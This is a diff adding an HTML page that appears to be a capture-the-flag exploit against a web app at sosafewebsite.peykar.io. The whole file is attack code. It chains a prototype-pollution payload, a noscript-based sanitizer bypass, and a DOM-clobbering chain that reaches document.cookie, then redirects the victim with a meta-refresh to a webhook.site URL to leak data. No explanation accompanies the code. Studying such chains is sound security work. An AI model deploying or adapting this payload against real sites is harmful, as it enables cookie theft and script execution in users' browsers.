@@ -1,0 +1,22 @@
+<html>
+<script>
+var ppPayload = `{"name":{"__proto__":{"__proto__":{"constructor":{"getOwnPropertyNames":"B"}}}}}`;
+var customFilterBypass = `
+<noscript>
+        <img/id="
+             </noscript><img><iframe/srcdoc='HTMLINJ'></iframe><meta/http-equiv='refresh'/content='1;url=https://webhook.site/b04a282e-7328-4729-a6e1-7879c3e99415' />
+        ">
+</noscript>`.replace(/\n/g,"").replace(/ /g,"").replace(/\t/g,"");
+var domclobbering = `<iframe srcdoc="NEXT" name="debugOptions"></iframe><link href="/ff" rel="stylesheet"><link href="/qqq" rel="stylesheet"><link href="/ffds" rel="stylesheet"><link href="/df" rel="stylesheet"><script src="/js/debug.js"><\/script>`.replace(/"/g,"&quot;");
+domclobbering = domclobbering.replace("NEXT",`
+<iframe srcdoc="NEXT" name="0"></iframe>
+`).replace(/"/g,"&amp;quot;")
+
+domclobbering = domclobbering.replace("NEXT",`
+<br id="0" clear="parent"><font id="1" face="name"><object id="2" code="document"></object><input id="3" accept="cookie">
+`.replace(/"/g,"&amp;amp;quot;"));
+
+customFilterBypass = customFilterBypass.replace("HTMLINJ",domclobbering).replace(/\n/g,"").replace(/ /g,"/");
+window.location=(`http://sosafewebsite.peykar.io:7070/?name=${encodeURIComponent(customFilterBypass)}&wow=${encodeURIComponent(ppPayload)}`);
+</script>
+</html>
